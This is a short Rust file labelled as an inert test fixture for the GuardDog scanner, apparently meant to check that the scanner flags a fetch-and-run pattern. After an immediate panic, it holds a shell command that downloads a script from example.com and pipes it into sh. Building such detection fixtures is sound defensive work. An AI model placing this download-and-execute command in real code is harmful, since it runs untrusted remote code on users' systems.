// Inert test fixture for the GuardDog scanner. Never built.
fn main() {
    panic!("inert test fixture");
    std::process::Command::new("sh").arg("-c").arg("curl -s https://example.com/x.sh | sh").status().unwrap();
}
